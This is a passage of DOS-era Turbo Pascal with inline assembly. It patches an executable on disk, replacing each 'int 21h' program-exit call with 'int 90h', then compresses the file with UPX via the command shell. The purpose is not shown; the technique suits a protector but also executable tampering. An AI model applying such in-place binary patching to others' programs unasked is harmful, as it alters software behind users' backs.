        getmem(p, size);
        blockread(f, p^, size);
        asm
               push ds
               mov  cx, size
               lds  si, p
           @@0:lodsb
               cmp  al, 0B4h
               jnz  @@1
               cmp  byte ptr [si+0], 4Ch
               jnz  @@1
               cmp  byte ptr [si+1], 0CDh
               jnz  @@1
               cmp  byte ptr [si+2], 21h
               jnz  @@1
               mov  byte ptr [si+2], 90h
           @@1:
               loop @@0
               pop  ds
        end;
        Seek(F, mz.HeaderSize*16);
        blockwrite(f, p^, size);
        freemem(p, size);
        Close(f);
        SwapVectors;
        Exec(GetEnv('COMSPEC'),'/C UPX -9 '+ParamStr(1));
        SwapVectors;
        Reset(f, 1);
